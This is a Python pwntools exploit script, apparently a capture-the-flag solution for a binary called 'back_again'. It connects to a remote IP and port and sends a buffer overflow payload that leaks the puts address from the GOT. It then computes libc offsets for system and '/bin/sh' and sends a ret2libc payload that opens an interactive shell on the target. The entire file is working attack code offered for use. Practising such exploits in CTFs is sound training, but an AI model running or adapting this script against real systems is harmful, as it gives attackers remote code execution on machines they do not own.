#!/usr/bin/env python3

from pwn import *
from struct import *

context.log_level="debug"
#context.terminal="tmux"
elf = ELF("dist/back_again")

p = remote("34.92.63.126", 59001)
#p = process("dist/back_again")
libc=ELF("writeup/libc-2.31.so")

#gdb.attach(p,'''b*0x0804920a
#c''')
main = elf.sym['main']
puts = elf.plt['puts']
gets_got = elf.got['gets']
puts_got = elf.got['puts']
pop_rdi = 0x000000000040122b
ret = 0x0804900e

payload = b"A"*20  + p32(puts) +p32(main)+ p32(puts_got)
#payload = b"A"*20  + p32(puts) +p32(puts)+ p32(puts_got) + p32(gets_got)

#payload = b"A"*20 + p32(main)
p.recv()
p.sendline(payload)
raw=p.recvline().strip()[0:4].ljust(4, b'\x00')

leak=unpack("I",raw)[0]
libc_base = leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))
try:
    log.info("="*15)
    log.info("puts offset:"+hex(libc.symbols['puts']))
    log.info("system offset:"+hex(libc.symbols['system']))
    log.info("binsh offset:"+hex(next(libc.search(b'/bin/sh'))))
    log.info("="*15)
finally:
    log.info("puts@LIBC: " + hex(leak))
    log.info("Libc base: " + hex(libc_base))
    log.info("system@LIBC: " + hex(system))
    log.info("/bin/sh: " + hex(bin_sh))

payload = b"A"*20 +  p32(system) + b"A"*4 + p32(bin_sh)
#payload = b"A"*56 + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)


p.recv()
p.sendline(payload)

p.interactive()
